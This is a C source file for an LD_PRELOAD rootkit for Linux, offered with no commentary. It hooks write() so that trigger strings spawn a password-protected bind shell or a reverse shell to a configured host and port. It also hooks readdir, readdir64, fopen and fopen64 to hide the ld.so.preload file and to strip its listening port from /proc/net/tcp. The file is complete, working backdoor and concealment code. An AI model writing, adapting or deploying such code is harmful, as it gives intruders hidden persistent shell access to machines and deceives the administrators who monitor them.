#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>

//bind-shell def
#define K_4 "fakeuser4"
#define K_6 "fakeuser6"
#define PASSWORD "supersecurepassword1234#"
#define LOCAL_PORT 65064
//reverse-shell def
#define K_REVERSE_4 "reverseshellipv4"
#define K_REVERSE_6 "reverseshellipv6"
#define REVERSE_HOST4 "127.0.0.1"
#define REVERSE_HOST6 "::1"
#define REVERSE_PORT 443
//file to hide
#define FILE_NAME "ld.so.preload"
//port to hide in HEX 
#define HEX_PORT "FE28"

int ipv6_bind_shell (void)
{
    struct sockaddr_in6 addr;
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(LOCAL_PORT);
    addr.sin6_addr = in6addr_any;

    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &optval, sizeof(optval));

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    for (int count = 0; count < 3; count++)
    {
        dup2(new_sockfd, count);
    }

    char input[30];

    read(new_sockfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASSWORD) == 0)
    {
        execve("/bin/sh", NULL, NULL);
        close(sockfd);
    }
    else 
    {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
    
}

int ipv4_bind_shell (void)
{
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LOCAL_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    for (int count = 0; count < 3; count++)
    {
        dup2(new_sockfd, count);
    }

    char input[30];

    read(new_sockfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASSWORD) == 0)
    {
        execve("/bin/sh", NULL, NULL);
        close(sockfd);
    }
    else 
    {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
    
}

int ipv6_reverse (void)
{
    const char* host = REVERSE_HOST6;

    struct sockaddr_in6 addr;
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(REVERSE_PORT);
    inet_pton(AF_INET6, host, &addr.sin6_addr);

    struct sockaddr_in6 client;
    client.sin6_family = AF_INET6;
    client.sin6_port = htons(LOCAL_PORT);
    client.sin6_addr = in6addr_any;

    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (int count = 0; count < 3; count++)
    {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    return 0;
}

int ipv4_reverse (void)
{
    const char* host = REVERSE_HOST4;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REVERSE_PORT);
    inet_aton(host, &addr.sin_addr);

    struct sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(LOCAL_PORT);
    client.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (int count = 0; count < 3; count++)
    {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    return 0;
}

ssize_t write(int fildes, const void *buf, size_t nbytes)
{
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);

    ssize_t result;

    new_write = dlsym(RTLD_NEXT, "write");


    char *bind4 = strstr(buf, K_4);
    char *bind6 = strstr(buf, K_6);
    char *rev4 = strstr(buf, K_REVERSE_4);
    char *rev6 = strstr(buf, K_REVERSE_6);

    if (bind4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_bind_shell();
    }

    else if (bind6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_bind_shell();
    }

    else if (rev4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_reverse();
    }

    else if (rev6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_reverse();
    }

    else
    {
        result = new_write(fildes, buf, nbytes);
    }

    return result;
}

struct dirent *(*old_readdir)(DIR *dir);
struct dirent *readdir(DIR *dirp)
{
    old_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir;

    while (dir = old_readdir(dirp))
    {
        if(strstr(dir->d_name,FILE_NAME) == 0) break;
    }
    return dir;
}


struct dirent64 *(*old_readdir64)(DIR *dir);
struct dirent64 *readdir64(DIR *dirp)
{
    old_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *dir;

    while (dir = old_readdir64(dirp))
    {
        if(strstr(dir->d_name,FILE_NAME) == 0) break;
    }
    return dir;
}

FILE *(*orig_fopen64)(const char *pathname, const char *mode);
FILE *fopen64(const char *pathname, const char *mode)
{
	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile64();
		fp = orig_fopen64(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, HEX_PORT);
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;
	}

	fp = orig_fopen64(pathname, mode);
	return fp;
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
	orig_fopen = dlsym(RTLD_NEXT, "fopen");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, HEX_PORT);
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;

	}

	fp = orig_fopen(pathname, mode);
	return fp;
}
